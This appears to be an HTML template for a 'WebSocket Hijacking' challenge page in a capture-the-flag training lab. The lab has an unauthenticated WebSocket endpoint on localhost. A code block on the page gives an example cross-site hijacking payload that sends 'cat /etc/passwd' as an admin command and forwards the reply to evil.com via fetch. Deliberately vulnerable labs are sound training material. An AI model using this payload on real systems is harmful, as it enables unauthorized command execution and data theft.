<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title><%= title %> - EliteHackLab</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"></head>
<body>
  <div class="matrix-bg"></div>
  <nav class="main-nav"><div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div><div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a><a href="/labs/websocket"><i class="fas fa-flask"></i> WS Labs</a></div></nav>
  <div class="lab-container">
    <div class="lab-header"><h1>🔌 WebSocket Hijacking</h1><div class="lab-info"><span class="lab-tag difficulty-hard">Hard</span><span class="lab-tag points"><i class="fas fa-star"></i> 30 pts</span></div></div>
    <div class="lab-section">
      <h2><i class="fas fa-crosshairs"></i> Objective</h2>
      <p>The WebSocket server has no Origin check and no authentication. Connect and send an admin_command to execute server commands without authorization.</p>
    </div>
    <div class="lab-section">
      <h2><i class="fas fa-terminal"></i> WebSocket Client</h2>
      <div class="vulnerable-form">
        <button onclick="connectWS()" class="btn">Connect to ws://localhost:3000/ws</button>
        <label style="margin-top:1rem;">Message Type:</label>
        <select id="wsType"><option value="admin_command">admin_command</option><option value="chat">chat</option></select>
        <label>Command/Message:</label>
        <input type="text" id="wsMessage" value="whoami" autocomplete="off">
        <button onclick="sendWS()" class="btn btn-danger" style="margin-top:0.5rem;">Send</button>
      </div>
      <div id="wsStatus" style="margin-top:0.5rem; font-size:0.85rem; color:var(--text-secondary);">Disconnected</div>
      <div id="wsResult" class="result-box" style="margin-top:1rem; max-height:300px; overflow-y:auto;"></div>
      <div class="code-block">// No Origin check → Cross-site WebSocket Hijacking (CSWSH)
// From evil.html on attacker's site:
const ws = new WebSocket('ws://localhost:3000/ws');
ws.onopen = () => ws.send(JSON.stringify({type:'admin_command', command:'cat /etc/passwd'}));
ws.onmessage = (e) => fetch('http://evil.com/steal?data='+e.data);</div>
    </div>
    <div class="flag-submit"><h3><i class="fas fa-flag"></i> Capture The Flag</h3>
      <form onsubmit="submitFlagInline('websocket-attack','flagInput_ws','flagResult_ws'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;"><input type="text" id="flagInput_ws" placeholder="FLAG{...}" autocomplete="off"><button type="submit" class="btn">Submit</button></form>
      <div id="flagResult_ws" style="display:none; margin-top:1rem;"></div>
    </div>
  </div>
  <script src="/js/main.js"></script>
  <script>
    let ws;
    function connectWS(){
      ws = new WebSocket(`ws://${location.host}/ws`);
      ws.onopen = ()=>{document.getElementById('wsStatus').innerHTML='<span style="color:var(--neon-green);">✓ Connected</span>';};
      ws.onmessage = (e)=>{document.getElementById('wsResult').innerHTML+='<div style="border-bottom:1px solid var(--border-color);padding:0.3rem 0;">'+e.data+'</div>';};
      ws.onclose = ()=>{document.getElementById('wsStatus').innerHTML='<span style="color:var(--neon-red);">✗ Disconnected</span>';};
    }
    function sendWS(){
      if(!ws||ws.readyState!==1)return alert('Connect first!');
      const msg = JSON.stringify({type:document.getElementById('wsType').value, command:document.getElementById('wsMessage').value, user:'hacker', message:document.getElementById('wsMessage').value});
      ws.send(msg);
    }
  </script>
</body>
</html>
